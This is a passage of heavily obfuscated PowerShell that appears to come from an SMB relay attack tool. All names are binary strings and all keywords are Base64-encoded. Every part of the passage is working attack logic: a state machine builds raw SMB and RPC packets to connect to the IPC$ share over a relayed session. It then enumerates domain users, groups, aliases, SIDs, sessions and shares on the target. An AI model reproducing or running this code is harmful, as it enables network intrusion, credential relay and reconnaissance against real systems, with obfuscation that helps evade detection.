                                ${01011110000111110} = ${10111110001011100}[40..43]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                            {
                                if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -or $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))))
                                {
                                    ${10001101011100010}.session_message_ID_table[${10001101011100010}.session_count] = ${10011111011010000}
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                }
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${01011110000111110} = 0x00,0x00,0x00,0x00
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x03,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _01111011001111111 ${00110100011000011}
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}    
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x04,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _01001101010010100
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))                        
                    }
                }
                if(${10000001100000110} -and $Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
                {
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay failed on $Target") > $null
                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                }
            }
            catch
            {
                ${10000111101001011} = $_.Exception.Message
                ${10000111101001011} = ${10000111101001011} -replace "`n",""
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim()) stage ${00111110010110110}") > $null
                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
            }
        }
        if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
        {
            return ${10101001011110010}
        }
        else
        {
            ${_10010010110001100}.Close()
        }
    }
    function _00100101000001111
    {
        param (${_10010010110001100},${_00010000111001010},${_10110110010000000},${_00111001000100100},$Enumerate,$EnumerateGroup)
        ${10111110001011100} = New-Object System.Byte[] 81920
        ${00011101010100101} = $false
        ${10011111011010000} =  ${10001101011100010}.session_message_ID_table[${10001101011100010}.session_count]
        ${01101100111100100} = $Enumerate
        ${01011110000111110} = 0x00,0x00,0x00,0x00
        ${00111010101100001} = $EnumerateGroup
        if(${01101100111100100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))
        {
            ${10011011101000101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
        }
        else
        {
            ${10011011101000101} = ${01101100111100100}    
        }
        ${01101101100000110} = "\\" + $Target + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
        ${10110111000110011} = [System.Text.Encoding]::Unicode.GetBytes(${01101101100000110})
        ${10010111010110000} = 0
        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
        ${00001111100000001} = ${_10010010110001100}.GetStream()
        while (${00000100101011111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${00000100101011111})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x06,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _10010111100111001 ${01010110110010100}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _00011011000100100 $Target
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _00000101101101011 $Target
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x05,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _10100101010101111 ${10000101000100010}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}  
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _01010000101111000 ${00000100010000110}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _00011011100101111 ${00101011001111100}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x02,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _01101010011100001
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA=='))) 
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _10111010110110110 ${00000100010000110} ${00111010101100001}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _00001110110100000 ${00000100010000110} ${00100101100001010} ${01011111001011110}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10010110101100110} = _10100100101101101 ${01010111100011011}
                        ${10100110101110010} = _00110101111101011 ${10010110101100110} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10100110101110010}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${10100110101110010}.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10100110101110010}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10100110101110010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        ${00100001011011110}++
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10010110101100110} = _01000111111011111 ${01010111100011011} ${00000000110000110}
                        ${10100110101110010} = _00110101111101011 ${10010110101100110}
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10100110101110010}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${10100110101110010}.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}   
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10100110101110010}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10100110101110010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10010110101100110} = _01110001101111010
                        ${10100110101110010} = _00110101111101011 ${10010110101100110} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10100110101110010}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${10100110101110010}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10100110101110010}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10100110101110010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10010110101100110} = _10010000100100010 ${01010111100011011}
                        ${10100110101110010} = _00110101111101011 ${10010110101100110}
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10100110101110010}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${10100110101110010}.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}   
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10100110101110010}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10100110101110010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA=='))) 
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10001010110010011} = _10000000101011000 $Target
                        ${10011101100001011} = _00110101111101011 ${10001010110010011}
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10011101100001011}.Length 1024
                        ${00110101010010001} = _10101110101101000 0x03 ${10011101100001011}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10011101100001011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10011101100001011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10001010110010011} = _00011011000001011 $Target
                        ${10011101100001011} = _00110101111101011 ${10001010110010011} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${10011101100001011}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${10011101100001011}.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${10011101100001011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${10011101100001011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                    {  
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _10111111010100000 ${00000100010000110} ${01110001100010011}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                    {    
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _10100101111111101 ${00001100111011001} ${10101110101110110} ${10110010101101111}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x07,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _01000100001110110 ${00000100010000110} ${01110001100010011}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
